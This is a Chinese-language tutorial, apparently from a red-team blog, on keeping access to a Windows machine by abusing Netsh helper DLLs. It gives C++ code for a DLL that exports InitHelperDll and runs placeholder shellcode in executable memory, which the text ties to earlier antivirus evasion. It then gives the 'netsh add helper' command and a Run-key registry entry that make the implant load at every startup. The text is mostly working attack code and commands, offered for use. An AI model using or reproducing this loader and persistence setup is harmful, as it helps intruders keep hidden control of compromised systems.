# Windows权限维持-Netsh

## 简介

Netsh是Windows中用于网络配置命令工具，管理员可以使用它来执行与系统的网络配置有关的任务，可以用来配置防火墙策略用于转发。Netsh可以通过使用DLL文件来扩展自身的功能，基于此功能可以用来加载任意DLL，实现权限维持。

## DLL

这里的dll是用来加载的，跟直接用rundll32调用的是有区别的。这里给出函数原型：

```
1.  `DWORD`
    
2.  `WINAPI`
    
3.  `InitHelperDll(`
    
4.  `    DWORD      dwNetshVersion,`
    
5.  `    PVOID      pReserved`
    
6.  `)`
    
```

然后用vs创建一个dll项目，根据这个原型，将执行内容换成之前静态免杀中使用的加载shellcode的形式。

```
1.  `#include <windows.h>`
    
2.  
    
3.  `unsigned char shellcode[] ="xxxxxxxxxxxxxxxx";`
    
4.  
    
5.  `extern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD      dwNetshVersion, PVOID pReserved)`
    
6.  `{`
    
7.  `    ((void(*)(void))&shellcode)();`
    
8.  `}`
    
```

稍微改写下。

```
1.  `…………`
    
2.  `DWORD WINAPI RunCode(LPVOID lpParameter)`
    
3.  `{`
    
4.  `    unsigned char shellcode[] =“xxxxxxxxxx”;`
    
5.  `    LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);`
    
6.  `    memcpy(Memory, shellcode, sizeof(shellcode));`
    
7.  `    ((void(*)())Memory)();`
    
8.  `    return 1;`
    
9.  `}  `
    
10.  
     
11.  `extern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID`
     
12.  `pReserved)`
     
13.  `{`
     
14.  `    HANDLE hand;`
     
15.  `    hand = CreateThread(NULL, 0, RunCode, NULL, 0, NULL);`
     
16.  `    CloseHandle(hand);`
     
17.  `    return NO_ERROR;`
     
18.  `}`
     
```

编译出来。

### 添加HelperDll

在命令行中运行netsh添加dll。

```
1.  `C:\>netsh`
    
2.  `netsh>add helper path\xx.dll`
    
```

![](../Images/531a6cf75e9a41d565236dc5d1819453.png)

添加后，会在注册表中多一项：  

```
1.  `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh`
    
```

![](../Images/06f073ffd226c879fb2d113ad044883d.png)然后只要每次运行netsh，就会上线。  
![](../Images/0fd965b15771ddd7825a7fcce8b951fd.png)

不过默认情况下，netsh不是自启动的需要在注册表中创建一下，以保证持久性。

```
1.  `reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v`
    
2.  `NetshStart /t REG_SZ /d "C:\Windows\SysWOW64\netsh"`
    
3.  `reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run\\ -v`
    
4.  `NetshStart -d 'C:\Windows\SysWOW64\netsh'`
    
```

### 补充

在有些机器上含有代理工具的，似乎是不需要添加netsh为自启的。
